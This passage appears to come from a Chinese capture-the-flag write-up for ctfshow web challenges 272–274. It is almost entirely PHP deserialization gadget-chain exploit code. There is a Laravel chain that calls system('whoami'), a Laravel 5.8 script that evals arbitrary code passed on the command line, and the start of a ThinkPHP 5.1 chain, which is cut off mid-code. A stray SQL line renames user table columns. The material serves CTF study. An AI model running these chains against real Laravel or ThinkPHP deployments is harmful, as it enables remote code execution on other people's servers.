data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">test</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">// 一个实例化的类 Illuminate\\Auth\\GenericUser</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">app</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 一个实例化的类 Illuminate\\Foundation\\Application</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">command</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 要执行的 php 函数 system</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">parameters</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 要执行的 php 函数的参数  array ('id')</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DefaultGenerator</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$default</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$default</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">default</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$default</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Foundation</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Application</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$instances</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$instances</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">instances</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Illuminate\\Contracts\\Console\\Kernel'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$instances</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$defaultgenerator</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Faker<span class=\"token punctuation\">\\</span>DefaultGenerator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hello\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string double-quoted-string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token variable\">$app</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Application</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token variable\">$application</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Application</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$app</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token variable\">$pendingcommand</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Testing<span class=\"token punctuation\">\\</span>PendingCommand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$defaultgenerator</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$application</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pendingcommand</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><h1 id=\"web-272-273\"><a class=\"anchor\" href=\"#web-272-273\">#</a> web 272、273</h1>\n<p>laravel5.8 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Author:monitor</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>description:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    laravel deserialization chain</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Broadcasting</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">PendingBroadcast</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$events</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$event</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$events</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$event</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">events</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$events</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">event</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$event</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Bus</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Dispatcher</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">queueResolver</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$queueResolver</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Mockery<span class=\"token punctuation\">\\</span>Loader</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">EvalLoader</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Mockery<span class=\"token punctuation\">\\</span>Generator</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MockDefinition</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$config</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MockConfiguration</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Queue</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CallQueuedClosure</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connection</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connection</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">namespace</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">{</span>   </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argc</span><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Description:\\n\\tUse laravel deserialization to eval php code,don't need to input php tags.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\nUsage:\"</span> <span class=\"token operator\">.</span><span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" &lt;code&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token variable\">$mockconfiguration</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Generator<span class=\"token punctuation\">\\</span>MockConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token variable\">$mockdefination</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Generator<span class=\"token punctuation\">\\</span>MockDefinition</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mockconfiguration</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" exit;?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token variable\">$callqueuedclosure</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Queue<span class=\"token punctuation\">\\</span>CallQueuedClosure</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mockdefination</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token variable\">$evaload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Mockery<span class=\"token punctuation\">\\</span>Loader<span class=\"token punctuation\">\\</span>EvalLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token variable\">$dispatcher</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Bus<span class=\"token punctuation\">\\</span>Dispatcher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$evaload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"load\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token variable\">$pendingbroadcast</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Illuminate<span class=\"token punctuation\">\\</span>Broadcasting<span class=\"token punctuation\">\\</span>PendingBroadcast</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dispatcher</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$callqueuedclosure</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pendingbroadcast</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>xxxxxxxxxx&nbsp;0;alter table ctfshow_user change  <code>username</code>   <code>pass2</code>  varchar(100);alter table ctfshow_user change  <code>pass</code>   <code>username</code>  varchar(100);alter table ctfshow_user change  <code>pass2</code>   <code>pass</code>  varchar(100);sql</p>\n<h1 id=\"web-274\"><a class=\"anchor\" href=\"#web-274\">#</a> web 274</h1>\n<p>thinkphp 5.1 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"lin\"</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"calc.exe\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"calc\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"lin\"</span><span class=\"token operator\">=&gt;</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Request</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$hook</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$config</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 表单 ajax 伪装变量</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token string single-quoted-string\">'var_ajax'</span>         <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'_ajax'</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"var_ajax\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string single-quoted-string\">'lin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hook</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"visible\"</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"isAjax\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>concern<span class=\"token punctuation\">\\</span>Conversion</span><span class=\"token 